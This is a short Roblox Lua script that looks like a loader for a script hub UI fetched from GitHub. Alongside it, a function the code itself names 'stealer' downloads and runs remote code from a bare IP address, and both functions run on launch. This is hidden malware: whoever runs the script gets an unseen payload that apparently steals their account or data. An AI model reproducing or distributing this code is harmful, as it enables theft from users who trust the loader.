local function stealer()
    ID="69940e0d-5013-4466-b579-a9b68523f190";
    loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dy1zn4t/NatHub/refs/heads/main/loader"))();
end
task.spawn(stealer)
task.spawn(loadui)
